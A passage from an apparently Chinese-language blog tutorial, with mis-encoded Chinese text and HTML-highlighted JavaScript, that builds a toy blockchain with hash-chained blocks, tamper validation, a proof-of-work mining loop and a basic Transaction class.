class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// è·å¾—æœ€æ–°çš„åŒºå—</span><br>  <span class="hljs-title function_">getLatestBlock</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]<br>  &#125;<br><br><span class="hljs-comment">// æ‰‹åŠ¨å¢åŠ åŒºå—</span><br>  <span class="hljs-title function_">addBlock</span>(<span class="hljs-params">newBlock</span>) &#123;<br>    newBlock.<span class="hljs-property">preHash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span><br>    <span class="hljs-comment">// å› ä¸ºåœ¨å¤–éƒ¨æ— æ³•å¾—çŸ¥æ­¤æ—¶çš„preHashæ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥æ‰‹åŠ¨èµ‹å€¼</span><br>    newBlock.<span class="hljs-property">hash</span> = newBlock.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-comment">// computeHash()åœ¨Blockç±»æ˜¯æ„é€ æ—¶å€™è°ƒç”¨çš„ï¼Œä½†æ˜¯newBlockä¼ å…¥çš„æ—¶å€™æ²¡æœ‰preHashï¼Œæ‰€ä»¥æ„é€ çš„Hashæ˜¯é”™çš„ï¼Œéœ€è¦é‡æ–°ç”Ÿæˆ</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// åˆ«å¿˜äº†å¾€é“¾ä¸Šæ·»åŠ </span><br>  &#125;<br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-keyword">const</span> block2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b2&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block1)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br><br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231124145754763.png" alt="image-20231124145754763"></p><p>å¯ä»¥çœ‹åˆ°ï¼š</p><ul><li><code>b1</code>çš„<code>preHash</code>ä¸ä¸Šä¸€ä¸ªåŒºå—<code>Origin</code>çš„<code>hash</code>ä¸€è‡´</li><li><code>b2</code>çš„<code>preHash</code>ä¸ä¸Šä¸€ä¸ªåŒºå—<code>b1</code>çš„<code>hash</code>ä¸€è‡´</li><li>æˆåŠŸé“¾æ¥</li></ul><p>è¿™æ—¶å€™éœ€è¦è€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºåŒºå—é“¾å…·æœ‰ä¸å¯ç¯¡æ”¹æ€§</p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥é€šè¿‡<code>fanChain.chain[1].data = &#39;fake&#39;</code>è¿›è¡Œæ›´æ”¹dataæ•°æ®</p><p><img src="/posts/32752/image-20231124150247884.png" alt="image-20231124150247884"></p><p>ä¼šå‘ç°<code>b1</code>çš„æ•°æ®è¢«ç¯¡æ”¹äº†ï¼Œä½†æ˜¯<code>hash</code>ä¾æ—§ä¸å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¯¹é“¾ä¸­çš„åŒºå—å¢åŠ æ ¡éªŒè¿‡ç¨‹</p><p>æ ¡éªŒè¦è¿›è¡Œçš„è¿‡ç¨‹æœ‰ï¼š</p><ul><li>å¯¹æ¯”<code>Block</code>ä¸Šå‚¨å­˜çš„<code>hash</code>ï¼ˆä¹Ÿå°±æ˜¯åˆšåˆ›å»ºåŒºå—æ—¶å€™çš„<code>hash</code>ï¼‰ä¸é€šè¿‡å½“å‰<code>Block</code>æ•°æ®å†æ¬¡ç”Ÿæˆçš„<code>hash</code>ï¼Œä»¥åˆ¤æ–­åŒºå—çš„<code>data</code>æœ‰æ²¡æœ‰è¢«ç¯¡æ”¹</li><li>ä¸Šä¸€ä¸ªåŒºå—çš„<code>hash</code>ä¸å½“å‰åŒºå—çš„<code>preHash</code>æ˜¯å¦ä¸€è‡´ï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦æ„æˆé“¾å¼ç»“æ„</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// å¯¹åŒºå—è¿›è¡Œæ ¡éªŒ</span><br>  <span class="hljs-title function_">validateChain</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-comment">// å› ä¸ºèµ·å§‹åŒºå—æ²¡æœ‰preHashæ‰€ä»¥å•ç‹¬æ ¡éªŒ</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span> === <span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-property">hash</span> !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>      <span class="hljs-comment">// å¯¹åˆå§‹è¿›è¡Œæ ¡éªŒï¼ŒåŸå§‹çš„Hashä¸å†æ¬¡ç”Ÿæˆçš„Hashè¿›è¡Œå¯¹æ¯”</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span>; i++) &#123;<br><br>      <span class="hljs-comment">// åˆ¤æ–­å½“å‰Blockçš„dataæ˜¯å¦è¢«ç¯¡æ”¹</span><br>      <span class="hljs-keyword">const</span> blockToValidate = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i]<br>      <span class="hljs-keyword">if</span> (blockToValidate.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br><br>      <span class="hljs-comment">// æ¯”å¯¹å‰ä¸€ä¸ªBlockä¸å½“å‰Blockçš„hashå€¼æ˜¯å¦ç›¸åŒ</span><br>      <span class="hljs-keyword">const</span> preBlock = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i - <span class="hljs-number">1</span>]<br>      <span class="hljs-keyword">if</span> (preBlock.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-property">preHash</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  &#125;<br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-keyword">const</span> block2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b2&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block1)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain.<span class="hljs-title function_">validateChain</span>())<br><br><span class="hljs-comment">// å°è¯•ç¯¡æ”¹åŒºå—</span><br>fanChain.<span class="hljs-property">chain</span>[<span class="hljs-number">1</span>].<span class="hljs-property">data</span> = <span class="hljs-string">&#x27;fake&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain.<span class="hljs-title function_">validateChain</span>())<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br><br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231124150847683.png" alt="image-20231124150847683"></p><p>å¯ä»¥å‘ç°<code>fanChain</code>åœ¨è¢«äººå·¥ç¯¡æ”¹ä¹‹åï¼Œè¢«æ ¡éªŒå‡ºæ¥äº†</p><p>å…¶æ¬¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åŒæ—¶ç¯¡æ”¹åŒºå—çš„<code>hash</code></p><p><code>fanChain.chain[1].hash = fanChain.chain[1].computeHash()</code></p><p><img src="/posts/32752/image-20231124151938859.png" alt="image-20231124151938859"></p><p>ä½†æ˜¯å‘ç°ä¾ç„¶æ ¡éªŒå¤±è´¥ï¼Œè¿™æ˜¯å› ä¸º<code>b1</code>çš„<code>hash</code>æ”¹å˜äº†ï¼Œæ‰€ä»¥å¯¼è‡´<code>b2</code>çš„<code>preHash</code>ä¸<code>b1</code>çš„<code>hash</code>ä¸ä¸€è‡´äº†ï¼Œä¸Šä¸‹æ— æ³•é“¾æ¥</p><h2 id="2ã€å®ç°å·¥ä½œé‡è¯æ˜æœºåˆ¶"><a href="#2ã€å®ç°å·¥ä½œé‡è¯æ˜æœºåˆ¶" class="headerlink" title="2ã€å®ç°å·¥ä½œé‡è¯æ˜æœºåˆ¶"></a>2ã€å®ç°å·¥ä½œé‡è¯æ˜æœºåˆ¶</h2><p>ä¸Šè¿°å®ç°äº†ä¸€ä¸ªç®€å•çš„åŒºå—é“¾ç»“æ„ï¼Œæˆ‘ä»¬åªè¦é€šè¿‡<code>computeHash</code>ç®—å‡ºå“ˆå¸Œå€¼å°±å¯ä»¥æŠŠåŒºå—åŠ åˆ°é“¾ä¸Š</p><p>ä½†æ˜¯æ¯”ç‰¹å¸ä¸­ï¼Œéœ€è¦ç”Ÿæˆçš„<code>hash</code>æ»¡è¶³ç‰¹å®šæ¡ä»¶ï¼Œæ¯”å¦‚å“ˆå¸Œå‰ç¼€ä¸‰ä½å…¨ä¸º0ï¼Œç­‰â€¦</p><p>æ‰€ä»¥å¦‚æœéœ€è¦æ»¡è¶³çš„æ¡ä»¶è¶Šå¤šï¼Œéœ€è¦çš„ç®—åŠ›å°±è¶Šå¤§</p><ul><li>è¿™é‡Œæˆ‘ä»¬å®šä¹‰<code>nonce</code>ä½œä¸ºæ”¹å˜é‡</li><li>ç”¨<code>mine()</code>è¿›è¡Œç©·ä¸¾æ¯”å¯¹</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Block ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">data, preHash</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data <span class="hljs-comment">// åŒºå—å‚¨å­˜çš„æ•°æ®</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash <span class="hljs-comment">// å‚¨å­˜ä¸Šä¸€ä¸ªåŒºå—æ•°æ®çš„å“ˆå¸Œå€¼</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> = <span class="hljs-number">0</span> <span class="hljs-comment">// æŒ–ï¼ˆæ¯”å¯¹ï¼‰çš„æ¬¡æ•°</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>() <span class="hljs-comment">// å½“å‰åŒºå—æ•°æ®çš„å“ˆå¸Œå€¼</span><br>  &#125;<br><br><span class="hljs-comment">// ç”Ÿæˆè¯¥åŒºå—çš„Hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span>).<span class="hljs-title function_">toString</span>() <span class="hljs-comment">// å¢åŠ nonceä½œä¸ºæ”¹å˜é‡</span><br>  &#125;<br><br><span class="hljs-comment">// ç”ŸæˆæŒ–çŸ¿æ‰€æ¯”å¯¹çš„å‰ç¼€ difficultyè¶Šå¤§éœ€è¦æ—¶é—´è¶Šé•¿</span><br>  <span class="hljs-title function_">getAnswer</span>(<span class="hljs-params">difficulty</span>) &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">Ans</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> u = <span class="hljs-number">0</span>; u &lt; difficulty; u++) &#123;<br>      <span class="hljs-title class_">Ans</span> += <span class="hljs-string">&#x27;0&#x27;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Ans</span><br>  &#125;<br><br><span class="hljs-comment">// æŒ–ï¼</span><br>  <span class="hljs-title function_">mine</span>(<span class="hljs-params">difficulty</span>) &#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, difficulty) === <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnswer</span>(difficulty))<br>        <span class="hljs-comment">// è¿›è¡Œå‰ç¼€æ¯”å¯¹</span><br>        <span class="hljs-keyword">break</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span>++<br>    &#125;<br>  &#125;<br><br><br><span class="hljs-comment">/////////// class Chain ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span> = [<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">makeGenesis</span>()] <span class="hljs-comment">// ä¸€ä¸ªé“¾ä¸­åº”ç”±å¤šä¸ªåŒºå—ç»„æˆæ‰€ä»¥èµ‹å€¼æˆæ•°ç»„</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span> = <span class="hljs-number">3</span> <span class="hljs-comment">// è®¾ç½®éš¾åº¦ä¸º3ï¼Œä¹Ÿå°±æ˜¯éœ€è¦hashæ»¡è¶³å‰ç¼€ä¸‰ä½å…¨ä¸º0</span><br>  &#125;<br><br><span class="hljs-comment">// æ‰‹åŠ¨å¢åŠ åŒºå—</span><br>  <span class="hljs-title function_">addBlock</span>(<span class="hljs-params">newBlock</span>) &#123;<br>    newBlock.<span class="hljs-property">preHash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span><br>    <span class="hljs-comment">// å› ä¸ºåœ¨å¤–éƒ¨æ— æ³•å¾—çŸ¥æ­¤æ—¶çš„preHashæ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥æ‰‹åŠ¨èµ‹å€¼</span><br>    newBlock.<span class="hljs-property">hash</span> = newBlock.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-comment">// computeHash()åœ¨Blockç±»æ˜¯æ„é€ æ—¶å€™è°ƒç”¨çš„ï¼Œä½†æ˜¯newBlockä¼ å…¥çš„æ—¶å€™æ²¡æœ‰preHashï¼Œæ‰€ä»¥æ„é€ çš„Hashæ˜¯é”™çš„ï¼Œéœ€è¦é‡æ–°ç”Ÿæˆ</span><br>    newBlock.<span class="hljs-title function_">mine</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span>) <span class="hljs-comment">// è¿›è¡Œæ¯”å¯¹å‰ç¼€</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// åˆ«å¿˜äº†å¾€é“¾ä¸Šæ·»åŠ </span><br>  &#125;<br><br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-keyword">const</span> block2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b2&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block1)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231124154532552.png" alt="image-20231124154532552"></p><p>è§‚å¯Ÿå‘ç°åœ¨<code>nonce</code>ä¸º4649å’Œ3687æ—¶å¾—åˆ°å¯è¡Œçš„<code>hash</code></p><h2 id="3ã€åˆ›é€ è‡ªå·±çš„æ•°å­—è´§å¸"><a href="#3ã€åˆ›é€ è‡ªå·±çš„æ•°å­—è´§å¸" class="headerlink" title="3ã€åˆ›é€ è‡ªå·±çš„æ•°å­—è´§å¸"></a>3ã€åˆ›é€ è‡ªå·±çš„æ•°å­—è´§å¸</h2><p>æ—¢ç„¶è¯´è´§å¸ï¼Œé‚£ä¾¿æ˜¯ç”¨æ¥äº¤æ˜“çš„</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠä¸Šè¿°çš„<code>Block</code>ç±»ä¸­çš„<code>data</code>æ”¹å˜ä¸ºäº¤æ˜“å†…å®¹<code>Transaction</code>ï¼Œä»¥å®ç°è½¬è´¦</p><p>æ‰€ä»¥æˆ‘ä»¬è¿½åŠ ä¸€ä¸ª<code>Transaction</code>ç±»ï¼Œæ—¢ç„¶æ˜¯äº¤æ˜“ï¼Œé‚£å¿…ç„¶åŒ…å«</p><ul><li>è½¬è´¦äºº</li><li>æ”¶æ¬¾äºº</li><li>æ•°é¢</li><li>æ—¶é—´</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transaction</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>, to, amount, timeStamp</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> = <span class="hljs-keyword">from</span> <span class="hljs-comment">// å‘é€è€…å…¬é’¥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> = to <span class="hljs-comment">// æ¥æ”¶è€…å…¬é’¥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> = amount <span class="hljs-comment">// è½¬è´¦æ•°é‡</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> = timeStamp<br>  &#125;<br>    <br>    <span class="hljs-comment">// ç”Ÿæˆå¯¹åº”æ•°æ®çš„hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span>  + <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> ).<span class="hljs-title function_">toString</span>()<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/////////// class Block ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">transactions<span class="hljs-comment">/* data */</span>, preHash</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span> = transactions <span class="hljs-comment">// æœ¬æ¥æ˜¯this.data = data</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> = <span class="hljs-number">0</span> <span class="hljs-comment">// æŒ–çš„æ¬¡æ•°</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>  &#125;<br><br><span class="hljs-comment">// ç”Ÿæˆè¯¥åŒºå—çš„Hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<br>      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span>) + <span class="hljs-comment">// Transactionæ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥ç”¨JSON.stringifyå°†å…¶å­—ç¬¦åŒ–</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> +<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> <br>    ).<span class="hljs-title function_">toString</span>()<br>  &#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸Šè¿°çš„æ—¶é—´æˆ³<code>timeStamp</code>åœ¨æ¯”ç‰¹å¸ä½œè€…çš„è®ºæ–‡é‡Œï¼Œæ˜¯è¦åœ¨<code>block</code>ä¸­è¿›è¡Œç”Ÿæˆçš„ï¼Œè€Œä¸æ˜¯åœ¨<code>Transaction</code>ï¼Œæ‰€ä»¥è¿›è¡Œä¿®æ”¹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transaction</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>, to, amount, timeStamp</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> = <span class="hljs-keyword">from</span> <span class="hljs-comment">// å‘é€è€…å…¬é’¥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> = to <span class="hljs-comment">// æ¥æ”¶è€…å…¬é’¥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> = amount <span class="hljs-comment">// è½¬è´¦æ•°é‡</span><br>    <span class="hljs-comment">// this.timeStamp = timeStamp</span><br>  &#125;<br>    <br>    <span class="hljs-comment">// ç”Ÿæˆå¯¹åº”æ•°æ®çš„hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> <span class="hljs-comment">/* + this.timeStamp */</span>).<span class="hljs-title function_">toString</span>()<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/////////// class Block ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">transactions<span class="hljs-comment">/* data */</span>, preHash</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span> = transactions <span class="hljs-comment">// æœ¬æ¥æ˜¯this.data = data</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> = <span class="hljs-number">0</span> <span class="hljs-comment">// æŒ–çš„æ¬¡æ•°</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() <span class="hljs-comment">// åœ¨Blockç±»ä¸­è¿›è¡Œç”Ÿæˆ</span><br>  &#125;<br><br><span class="hljs-comment">// ç”Ÿæˆè¯¥åŒºå—çš„Hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<br>      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span>) + <span class="hljs-comment">// Transactionæ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥ç”¨JSON.stringifyå°†å…¶å­—ç¬¦åŒ–</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> +<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> +<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> <span class="hljs-comment">// åœ¨è¿™é‡Œæ·»åŠ </span><br>    ).<span class="hljs-title function_">toString</span>()<br>  &#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢å†™é“æŠŠdataæ”¹ä¸ºTransactionäº¤æ˜“æ•°æ®</p><p>æ‰€ä»¥ç°åœ¨çš„è¿™ä¸ªåŒºå—é“¾ç›¸å½“äºä¸€ä¸ªæ± å­ï¼ˆTransactionPoolï¼‰è£…æ»¡äº†äº¤æ˜“ï¼ˆTransactionï¼‰</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 